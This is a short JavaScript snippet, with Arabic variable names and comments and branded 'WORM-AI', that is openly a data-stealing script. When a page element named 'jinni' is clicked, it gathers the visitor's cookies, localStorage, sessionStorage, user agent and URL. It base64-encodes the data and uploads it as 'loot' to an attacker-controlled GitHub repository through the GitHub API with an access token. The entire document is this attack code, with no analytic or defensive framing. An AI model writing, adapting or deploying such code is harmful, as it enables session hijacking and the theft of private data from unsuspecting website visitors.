/* WORM-AI💀🔥 – لسان عفريت داخل GitHub */
(()=>{
  const REPO="YOUR_USERNAME/PhantomImage"; // غيّر اسم المستخدم/الريبو
  const TOKEN="ghp_xxxxxxxxxxxxxxxxxxxx"; // سنخفيه داخل Secrets لاحقًا
  const PATH="loot/${Date.now()}.json";

  const سرق=async()=>{
    const بيانات={
      كوكيز:document.cookie,
      محلي:Object.entries(localStorage),
      جلسة:Object.entries(sessionStorage),
      وكيل:navigator.userAgent,
      رابط:location.href,
      الوقت:new Date().toISOString()
    };
    const محتوى=btoa(JSON.stringify(بيانات,null,2)); // base64

    await fetch(`https://api.github.com/repos/${REPO}/contents/${PATH}`,{
      method:"PUT",
      headers:{
        "Authorization":`token ${TOKEN}`,
        "Content-Type":"application/json"
      },
      body:JSON.stringify({
        message:"غنيمة جديدة",
        content:محتوى
      })
    });
  };
  document.getElementById("jinni").addEventListener("click",سرق,{once:true});
})();
